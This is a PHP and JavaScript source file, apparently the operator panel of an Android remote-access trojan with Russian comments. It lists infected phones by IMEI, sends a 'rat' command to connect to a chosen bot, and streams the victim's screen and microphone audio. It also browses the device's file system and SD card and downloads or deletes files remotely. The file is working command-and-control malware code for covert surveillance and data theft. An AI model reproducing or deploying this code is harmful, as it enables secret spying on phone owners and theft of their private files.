<?php
$statusCode=false;
if (!(isset($_SESSION['panel_user'])))
{
	session_destroy();
	header("Location: /index.php");
}else{
	if ($_SESSION['panel_status']!="Action"){
		session_destroy();
		header("Location: /index.php");
	}else{
		$statusCode=true;
	}
}
if($statusCode){
?>
<div id="showAlert"></div>
<div class="content">
<center>
<input type='submit' value='File System' onClick="location.href='index.php?cont=ws&page=file-system'" style='width:140px; margin-left:30px;margin-top:10px; ' class='btn btn-outline-secondary'/>
<input type='submit' value='Stream Screen'onClick="location.href='index.php?cont=ws&page=streamscreen'" style='width:140px; margin-left:30px;margin-top:10px;' class='btn btn-outline-secondary'/>
<input type='submit' value='Stream Sound'onClick="location.href='index.php?cont=ws&page=streamsound'" style='width:140px; margin-left:30px;margin-top:10px;' class='btn btn-outline-secondary'/>
</center>

<div id='DIV_Server' style='margin-left:20px;width:25%; float:left;  min-height: 50px; margin-top:20px;	border: 0px solid black; border-color: #43717a;	background: #1D1F24; border-radius: 4px;' >
		     <a style='margin-left:77px;color:#ffffff'>ID Bots</a></br>
		<select name="comboBox_imeis" id="comboBox_imeis" style="width: 200px;color: #337ab7; font-size: 13; height: 28px;background: #1D1F24">
		<?php
		$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
        $connection->exec('SET NAMES utf8');

		$statement = $connection->prepare("SELECT IMEI,lastConnect FROM kliets");
		$statement->execute();
		foreach($statement as $row){
			$IMEI = $row['IMEI'];
			//******Получаем иконку состояния бота, вычисляем дату****
			$arr_data_from = explode(" ", $row['lastConnect']);
			$arr_data_till = explode(" ", date('Y-m-d H:i'));

			$date_from = $arr_data_from[0];
			$date_till = $arr_data_till[0];

			$date_from = explode('-', $date_from);
			$date_till = explode('-', $date_till);

			$time_from = mktime(0, 0, 0, $date_from[1], $date_from[2], $date_from[0]);
			$time_till = mktime(0, 0, 0, $date_till[1], $date_till[2], $date_till[0]);

			$day = ($time_till - $time_from)/60/60/24; //получаем разницу кол-во дней!
			//----------Секунды!-------/
			$date1 = new \DateTime($row['lastConnect']);
			$date2 = new \DateTime(date('Y-m-d H:i'));
			$diff = $date2->diff($date1);
			// разница в секундах
			$seconds = ($diff->y * 365 * 24 * 60 * 60) + //получаем разницу в секундах!
			($diff->m * 30 * 24 * 60 * 60) +
			($diff->d * 24 * 60 * 60) +
			($diff->h * 60 * 60) +
			($diff->i * 60) +
			$diff->s;
			//----------обработка состояние иконки on/off-------/
			if($day>=2){}
			else{
				if($seconds<=120){
					echo "<option value='$IMEI'>$IMEI";
				}
			}
		}
		?>
		</select> </br>
		<input type='submit' value='Connect' onClick='sendDataCommand()' style='width: 90px; margin-top:2px; margin-right:0px;' class='btn btn-outline-success'/>
		<input type='submit' value='Disconnect' onClick='disconnect()' style='width: 107px; margin-top:2px; margin-right:5px;' class='btn btn-outline-danger'/>
		</br>
		<div id="CheckPort" style="padding-top:9px">
			<img src="images/loader.gif" style="margin-top:5px; margin-left:60px;width:14%; height:5%"/>
		</div>
		</br>

</div>
<?php
$domain = $_SERVER['SERVER_NAME'];
if (isset($_SERVER['HTTPS']))
    $scheme = $_SERVER['HTTPS'];
else
    $scheme = '';
if (($scheme) && ($scheme != 'off')) $scheme = 'https';
else $scheme = 'http';

$urlpanel = "$scheme://$domain";

?>
<script>

	function sendDataCommand(){
		var imei = document.getElementById("comboBox_imeis").value;
		updateBotID(imei);
		var url = '<?php echo $urlpanel?>';
		$.ajax({url: 'application/set/commandBots.php?comboBox_commands=rat&text_imei='+ imei+'&url='+url,cache: false});

		startNatif('success','The team was successfully added!');
	}

	function updateBotID(imei){
		$.ajax({url: 'application/websocket/utils.php?updateimei='+ imei,cache: false});
	}

	function disconnect(){
		$.ajax({url: 'application/websocket/utils.php?updateimei=',cache: false});
		startNatif('success','The сlient successfully disabled!!');
	}

</script>
<?php
}
$page = $_GET['page'];
echo "<center>";
if($page == "file-system"){
	FileSystem();
}
elseif($page == "streamscreen"){
	StreamScreen();
}
elseif($page == "streamsound"){
	StreamSound();
}
else{
	FileSystem();
}
echo "</center>";

function StreamSound(){
	echo "<div id='DIV_SOUND'  style='width:50%; margin-left:10%; min-height: 300px;   margin-top:20px;	border: 1px solid black; border-color: #43717a;	background: #1D1F24; border-radius: 4px;' >

	<div id='div_sound'>
		<center>Stream Sound</center>

			<input type='submit' onClick='javascript:void(addcommand(\"startforegroundsound\"))' value='Start Sound + Foreground' id='btcstartsreen' style='margin-right:5px;' class='btn btn-outline-success'/>
			<input type='submit' onClick='javascript:void(addcommand(\"startsound\"))' value='Start Sound' id='btcstartsreen' style='margin-right:5px;' class='btn btn-outline-success'/>
			<input type='submit' onClick='javascript:void(addcommand(\"stopsound\"))' value='Stop Sound' id='btcstopsreen' style='margin-right:5px;' class='btn btn-outline-success'/>
			<center>
			<div style='width:98%; height: 1px; background:#333;  margin-top: 20px' ></div></br>

		</center>

	</div></br></div></br>

	<script>

	var startNameSound='';

	startSound();

    function startSound() {
		$.ajax({url: 'application/websocket/utils.php?sound=get',
				success: function(data) {
					if(startNameSound == data) return;
					start('application/websocket/sound/'+data+'.amr');
					startNameSound = data;
				}});
	}

	function start(path){
	  fetchBlob(path, function(blob) {
            playAmrBlob(blob);
        });
	}

	var gAudioContext = new AudioContext();

	function E(selector) {
        return document.querySelector(selector);
    }

    function getAudioContext() {
        if (!gAudioContext) {
            gAudioContext = new AudioContext();
        }
        return gAudioContext;
    }

    function fetchBlob(url, callback) {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', url);
        xhr.responseType = 'blob';
        xhr.onload = function() {
            callback(this.response);
        };
        xhr.onerror = function() {
        };
        xhr.send();
    }

    function readBlob(blob, callback) {
        var reader = new FileReader();
        reader.onload = function(e) {
            var data = new Uint8Array(e.target.result);
            callback(data);
        };
        reader.readAsArrayBuffer(blob);
    }


    function playAmrBlob(blob, callback) {
        readBlob(blob, function(data) {
            playAmrArray(data);
        });
    }

    function playAmrArray(array) {
        var samples = AMR.decode(array);
        if (!samples) {
            return;
        }
        playPcm(samples);
    }

    function playPcm(samples) {
        var ctx = getAudioContext();
        var src = ctx.createBufferSource();
        var buffer = ctx.createBuffer(1, samples.length, 8000);
        if (buffer.copyToChannel) {
            buffer.copyToChannel(samples, 0, 0)
        } else {
            var channelBuffer = buffer.getChannelData(0);
            channelBuffer.set(samples);
        }

        src.buffer = buffer;
        src.connect(ctx.destination);
        src.start();

		setTimeout(endAmr, 3000);
    }

	function  endAmr(){
		 startSound();
	}

	</script>
	";
}

function StreamScreen()
{
	echo "<div id='DIV_VNC'  style='width:50%; margin-left:10%; min-height: 300px;   margin-top:20px;	border: 1px solid black; border-color: #43717a;	background: #1D1F24; border-radius: 4px;' >

	<div id='div_vnc'>
	<center>Stream Screen</center>

		<input type='submit' onClick='javascript:void(addcommand(\"startscreenVNC\"))' value='Start screen' id='btcstartsreen' style='margin-right:5px;' class='btn btn-outline-success'/>
		<input type='submit' onClick='javascript:void(addcommand(\"stopscreenVNC\"))' value='Stop screen' id='btcstopsreen' style='margin-right:5px;' class='btn btn-outline-success'/>
		<center>
		<div style='width:98%; height: 1px; background:#333;  margin-top: 20px' ></div></br>
		<img src='application/websocket/VNC.jpg' alt='No image' name='VNC'></image>
		</center>

	</div>



	</br>
	</div>
	</br>


	<script>
	 refreshImageVNC();
    function refreshImageVNC() {
      if (!document.images) return;
	$.ajax({
		url: 'application/websocket/utils.php?statvnc=get',
		success: function(data) {
		$('.results').html(data);
		   if(data!= ''){
		  var ranint=getRandomInt(0,100000);
		  document.images['VNC'].src = 'application/websocket/VNC/'+data+'?r='+ranint;
                 setTimeout('refreshImageVNC()',300);
		}

	    }
	});
}

   function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
</script>
	";


}

function FileSystem()
{

$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
$connection->exec('SET NAMES utf8');
$sql = "SELECT urls,urlInj FROM settingsall WHERE id='1'";
$database = new database;
$path = $database->ws_GetPath();
if($path=="") $path = "/";

$FileFolder = $database->ws_GetFileFolder();
$file =  explode('!!!!', $FileFolder)[2];
$folder = explode('!!!!', $FileFolder)[1];

$arrayFile = explode('|', $file);
$arrayFolder= explode('|', $folder);

$command = $database->ws_GetCommand();
$command = str_replace('opendir:','',$command);
$command = str_replace('!!!','',$command);

echo "

	<div id='DIV_FileSystem' style='width:50%; margin-left:10%; min-height: 300px;  max-height: 500px; margin-top:20px;	border: 1px solid black; border-color: #43717a;	background: #1D1F24; border-radius: 4px;' >
<form name='FileSystem' method='post'>
	<div id='div_fs'>
	<center>File System</center></br>
		 <div  style='background:#1D1F24; text-align: left; margin-left:10px'>
			<input type='hidden' id='savepath' value='$path'/>
			<a id='idpath' style='background:#1D1F24;'>Path: $path</a></br>
			<a style='background:#1D1F24;'>Command: $command</a></br>
		</div>

		<center>
		<div style='width:98%; height: 1px; background:#333' ></div></br>
		</center>
		";

			echo "<div  style='background:#1D1F24; text-align: left; margin-left:10px; margin-botton:10px; overflow: auto; max-height: 300px;'>";
				if(($file=="")&&($folder=="")){
					if($path!=="/"){
						echo "<a href='javascript:void(0)' style='background:#1D1F24;' id='ListFile'>..</a></br>";
					}
					echo "</br></br></br></br></br>";
				}else{
					if($path=="/"){}else{
						echo "<a href='javascript:void(0)' style='background:#1D1F24;' id='ListFile'>..</a></br>";
					}
				}

				foreach($arrayFolder as $fold){
					if($fold !== "")echo "<span class='glyphicon glyphicon-folder-open' aria-hidden='true' style='color:#337ab7'></span>
					<a href='javascript:void(0)' style='background:#1D1F24;' id='ListFile'>$fold</a>
					<a href='javascript:void(addcommand(\"deletefilefolder:$path/$fold####\"))' class='glyphicon glyphicon-remove' aria-hidden='true' style='color:#337ab7' ></a></br>";
				}
				foreach($arrayFile as $fil){
					if($fil !== "")echo "<span class='glyphicon glyphicon-file' aria-hidden='true' style='color:#337ab7'></span>
					<a style='background:#1D1F24;'>$fil</a>
					<a href='javascript:void(addcommand(\"downloadfile:$path/$fil####\"))' class='glyphicon glyphicon-cloud-download' aria-hidden='true' style='color:#337ab7' ></a>
					<a href='javascript:void(addcommand(\"deletefilefolder:$path/$fil####\"))' class='glyphicon glyphicon-remove' aria-hidden='true' style='color:#337ab7' ></a></br>";
				}

			echo "</div>


		<center>
		<div style='width:98%; height: 1px; background:#333;  margin-top: 20px' ></div></br>
		</center>

	</div>
</form>
			<div style=' text-align: left; margin-left:10px; margin-top:-15px;'>
			Path <input type='text' name='intInterval' id='intInterval' style='color: #337ab7; background: #1D1F24; width: 50%; font-size: 12; height: 28px; border-radius: 5px;'></input>
			<input type='submit' value='Open' id='btnclick'   style='margin-right:5px;' class='btn btn-outline-success'/>
			<input type='submit' value='Open SD Card' id='btnclick2' style='margin-right:5px; ' class='btn btn-outline-success'/>

		</div>
	</br>
	</div>
	</br>
	";
}
$database = new database;
$database->ws_UpdateStatusFileFolder('0');
?>

   <script type="text/javascript">

   function addcommand(namefile){
	   $.ajax({
		   url: "application/websocket/utils.php?pathFileFolder=" + namefile,
		   cache: false
	   });
	   showFileFolder();
   }


     document.body.addEventListener("click", function(event) {
    if ((event.target.nodeName == "A")&&(event.target.getAttribute('id') == "ListFile")){

    var str = event.target.textContent;
	var path="";
	if(str == ".."){
		path = getUrlUp(document.getElementById("savepath").value);
		str="";
	}else{
		path = document.getElementById("savepath").value;
		path = path + "/";
	}



		$.ajax({
		   url: "application/websocket/utils.php?pathFileFolder=opendir:" + path + str + "####",
		   cache: false

	   });
	   showFileFolder();
	}
  });
    document.body.addEventListener("click", function(event) {
    if ((event.target.nodeName == "INPUT")&&(event.target.getAttribute('id') == "btnclick")){

		var text = document.getElementById("intInterval").value;

		$.ajax({
		   url: "application/websocket/utils.php?pathFileFolder=opendir:"+text+"####",
		   cache: false

	   });
	  showFileFolder();
	}
  });

   document.body.addEventListener("click", function(event) {
    if ((event.target.nodeName == "INPUT")&&(event.target.getAttribute('id') == "btnclick2")){

    		$.ajax({
		   url: "application/websocket/utils.php?pathFileFolder=opendir:getExternalStorageDirectory####",
		   cache: false

	   });
	  showFileFolder();
	}
  });


		//	var inProcessShow = false;
            function show()
            {
				// if (inProcessShow) return;
				//    inProcessShow = true;
                $.ajax({
                      url: "application/websocket/check.php",
                      cache: false,
                       success: function(html){

                           $('#CheckPort').fadeTo(0,0.1,function()
                                {
                                  $(this).html(html).fadeTo(0,1);
								//   inProcessShow = false;
                               });
                       }
                   });
            }
            $(document).ready(function(){
               // show();
                setInterval('show()',1000);
            });


			 function showFileFolder()
            {
                $.ajax({
                       url: "application/websocket/checkFileFolder.php",
                       cache: false,
                       success: function(html){
                           $('#div_fs').fadeTo(0,0.1,function()
                                {
                                  $(this).html(html).fadeTo(0,1);

                               });
                       }
                   });
            }
            $(document).ready(function(){
              //  showFileFolder();
				getStatusFileFolder();
                setInterval('getStatusFileFolder()',2000);
            });


			function newhandshake(){
                $.ajax({
                       url: "application/websocket/generatnewhandshake.php?starthandshake=GO",
                       cache: false

                   });
				   show();
            }

			function getStatusFileFolder(){
				$.ajax({
				  url: 'application/websocket/utils.php?statusfilefolder=get',
				  success: function(data) {
					$('.results').html(data);
					if(data=='1'){
						showFileFolder();
					}
				  }
				});
			}

			function getUrlUp(str){
				var execstr=str;

				execstr = execstr.replace('//','/');

				if(str!=="/"){
					if(execstr.substr(execstr.length-1,1)=="/"){
						execstr = execstr.substr(0,execstr.length-1);
					}
				}


				var arr = execstr.split('/');
				var str2="";
				for(var i=1;i<arr.length-1;i++){
					str2 = str2 + '/' + arr[i];
				}

				if(arr.length==2){
						str2="/";
				}

				return str2;
			}


		function httpGet(text) {
		$.ajax({
		  url: text,
		  success: function(data) {
			$('.results').html(data);
			return data;
		  }
		});

}
    </script>

</div>
